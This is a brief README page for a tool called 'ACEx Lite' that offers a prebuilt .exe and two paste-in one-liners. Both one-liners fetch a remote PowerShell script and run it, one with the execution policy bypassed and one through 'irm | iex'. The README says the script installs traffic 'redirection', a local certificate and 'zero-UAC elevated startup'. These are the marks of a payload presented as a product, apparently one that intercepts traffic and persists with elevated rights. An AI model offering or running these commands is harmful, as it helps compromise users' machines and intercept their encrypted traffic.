# Testing / ACEx Lite

Automated environment bootstrapper and direct launcher.

---

### Direct Download (No Command Needed)
If you don't want to run CMD or PowerShell, download the pre-compiled executable directly:

<p align="center">
  <a href="https://raw.githubusercontent.com/ershivshankar/Testing/main/acex-lite-final.exe">
    <img src="https://img.shields.io/badge/Download-ACEx%20Lite%20(.exe)-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Download EXE" height="40"/>
  </a>
</p>

Direct link: [Download acex-lite-final.exe](https://raw.githubusercontent.com/ershivshankar/Testing/main/acex-lite-final.exe)

---

### Option 1: Command Prompt (CMD)

Open `cmd.exe` and paste:

```cmd
curl -sL https://raw.githubusercontent.com/ershivshankar/Testing/main/boot.ps1 -o %TEMP%\b.ps1 && powershell -ExecutionPolicy Bypass -File %TEMP%\b.ps1
```

---

### Option 2: PowerShell

Open `powershell.exe` and paste:

```powershell
irm https://raw.githubusercontent.com/ershivshankar/Testing/main/boot.ps1 | iex
```

---

## What the Script Does Automatically
1. Downloads the package files directly to `%LOCALAPPDATA%\ACEx_Launcher`.
2. Installs required environment redirection and local certificate.
3. Automatically sets up zero-UAC elevated startup.
